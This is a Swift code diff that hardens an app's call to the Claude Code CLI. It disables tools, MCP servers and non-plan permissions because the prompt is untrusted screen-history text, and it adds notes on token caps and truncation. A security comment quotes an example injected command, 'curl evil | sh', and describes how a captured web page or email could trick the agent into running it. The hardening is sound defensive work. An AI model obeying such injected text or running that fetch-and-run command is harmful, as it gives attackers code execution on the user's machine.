@@ -75,6 +75,7 @@ actor LLMClient {
               maxTokens: Int, timeout: TimeInterval) async throws -> ChatOutput {
         try cfg.validate()
         // Claude Code is a local subprocess, not an HTTP endpoint — dispatch before the wire switch.
+        // maxTokens isn't forwarded: the Claude Code CLI has no output-token cap flag (see claudeCodeChat).
         if cfg.provider.isSubprocess {
             return try await claudeCodeChat(cfg, system: system, user: user, timeout: timeout)
         }
@@ -97,14 +98,13 @@ actor LLMClient {
         let stop_reason: String?
     }
 
-    /// Path to the `claude` binary, resolved once per client via the shared locator and cached here.
-    private var cachedClaudePath: String?
+    /// Path to the `claude` binary. The shared locator is the SINGLE source of truth: it caches, and its
+    /// `refresh()` (the "Re-check" button) invalidates that cache. We keep NO second cache here — a stale
+    /// copy would survive a refresh and keep invoking a moved/reinstalled binary at the old path.
     private func claudePath() async throws -> String {
-        if let p = cachedClaudePath { return p }
         guard let p = await ClaudeCodeLocator.shared.resolve() else {
             throw AutomationError.llm("Claude Code not found — install it and run `claude` once to sign in.")
         }
-        cachedClaudePath = p
         return p
     }
 
@@ -114,7 +114,21 @@ actor LLMClient {
     private func claudeCodeChat(_ cfg: LLMConfig, system: String, user: String,
                                 timeout: TimeInterval) async throws -> ChatOutput {
         let path = try await claudePath()
-        var args = ["-p", "--output-format", "json"]
+        // SECURITY (RCE): `claude -p` would otherwise run as the FULL agent WITH tools (Bash/Edit/Write/
+        // WebFetch/…). Our prompt is UNTRUSTED screen-history text, so an injected "run `curl evil | sh`"
+        // in a captured web page/email could execute on the user's Mac. Lock it to a pure TEXT generator:
+        //   • --tools ""          — empty allow-list of the built-in tool set ⇒ NO Bash/Edit/Write/Read/…
+        //   • --strict-mcp-config — with no --mcp-config, load ZERO MCP servers ⇒ no MCP tools appear either
+        //   • --permission-mode plan — belt-and-suspenders: plan mode never runs a non-read-only tool
+        // Allow-list-empty is deliberate over a deny-list: a deny-list would miss any tool a future CLI adds.
+        var args = ["-p", "--output-format", "json",
+                    "--tools", "",
+                    "--strict-mcp-config",
+                    "--permission-mode", "plan"]
+        // NOTE: the Claude Code CLI exposes NO output-token cap flag, so `maxTokens` cannot be enforced here
+        // (unlike the HTTP providers). We don't pretend to — truncation is detected AFTER the fact from the
+        // CLI's top-level `stop_reason` (see the return below). It also exposes no temperature flag, so —
+        // unlike the other providers, which pin 0.3 — Claude Code uses its own default temperature.
         let model = cfg.model.trimmingCharacters(in: .whitespacesAndNewlines)
         if !model.isEmpty, model != AIProvider.claudeCodeDefaultModel {
             args += ["--model", model]
@@ -141,6 +155,9 @@ actor LLMClient {
               !text.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty else {
             throw AutomationError.llm("empty model response")
         }
+        // `claude -p --output-format json` returns a top-level `stop_reason` ("end_turn" on a complete
+        // answer, "max_tokens" if the model hit a cap). That's our only truncation signal — since the CLI
+        // can't be told to cap output, this is post-hoc detection, not a guarantee.
         return ChatOutput(content: text, truncated: decoded.stop_reason == "max_tokens")
     }
 
